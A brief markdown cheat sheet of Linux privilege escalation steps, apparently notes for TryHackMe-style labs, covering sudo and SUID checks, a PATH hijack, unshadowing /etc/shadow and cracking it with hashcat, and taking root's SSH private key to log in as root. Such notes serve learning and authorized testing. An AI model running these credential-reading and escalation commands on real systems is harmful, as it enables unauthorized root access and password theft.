# Check what current user can run as sudo 
- `sudo -l`
- [gtfobins](https://gtfobins.github.io/)

# Find files that have SUID or SGID bits set.  
`find / -type f -perm -04000 -ls 2>/dev/null`

# Can we increase the privilege level of a process or binary with “Capabilities”? 
`getcap -r / 2>/dev/null`  

# Modify path? 
Add folders to PATH:  
```
export PATH=/tmp:$PATH
Create a root bash script: echo "/bin/bash" > thm
```

# Do we have access to /etc/password and /etc/shadow ? 

If we have write access, just create our own priv user, if not.

## hashcat the password hash? 

`unshadow /etc/passwd /etc/shadow > hashes.txt`

## Work out hash type e.g If it's $6$, it's SHA-512, $5$ is SHA-256, $1$ is MD5.
* https://hashcat.net/wiki/doku.php?id=example_hashes
* https://hashes.com/en/tools/hash_identifier
* https://www.kali.org/tools/hash-identifier/
## Run Hashcat (for SHA-512, mode 1800):

`hashcat -m 1800 hashes.txt wordlist.txt`

# Privilege Escalation tools
- LinPeas: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
- LinEnum: https://github.com/rebootuser/LinEnum
- LES (Linux Exploit Suggester): https://github.com/mzet-/linux-exploit-suggester
- Linux Smart Enumeration: https://github.com/diego-treitos/linux-smart-enumeration
- Linux Priv Checker: [https://github.com/linted/linuxprivchecker](https://github.com/linted/linuxprivchecker)

# Steal root / users ssh key? 

/root/.ssh/id_rsa

make sure to change permission to 600 once we have it,
chmod 600 id_rsa

ssh -i id_rsa root@lookup.thm

# File search

Search for log and txt files with string e.g tyler
```
find / -type f \( -name "*.txt*" -o -name "*.log*" \) -exec timeout 10s grep -i 'tyler' {} + 2>/dev/null | more
```